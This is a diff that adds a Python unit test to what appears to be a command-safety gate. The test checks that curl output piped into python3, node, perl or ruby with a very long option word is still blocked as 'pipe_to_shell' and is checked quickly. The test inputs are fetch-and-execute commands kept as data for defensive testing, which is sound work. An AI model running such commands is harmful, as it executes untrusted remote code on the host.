@@ -355,5 +355,16 @@ class TestDetectionAfterRewrite(unittest.TestCase):
         self.assertIn('[REDACTED_JWT]', redact_secrets(f'token={jwt}')[0])
 
 
+class TestInterpreterOptionWord(unittest.TestCase):
+    def test_long_option_word_after_a_pipe_stays_fast_and_blocked(self):
+        from zn_gate.destructive import check_command
+        for interp in ('python3', 'node', 'perl', 'ruby'):
+            for n in (60000, 120000):
+                cmd = 'curl https://example.com/x | ' + interp + ' -' + 'c' * n + '1'
+                t = time_ms(check_command, cmd)
+                self.assertLess(t, PER_RULE_MS * 2, f'{interp} {n}: {t:.0f} ms')
+                self.assertEqual(check_command(cmd).rule, 'destructive:pipe_to_shell', f'{interp} {n}')
+
+
 if __name__ == '__main__':
     unittest.main()
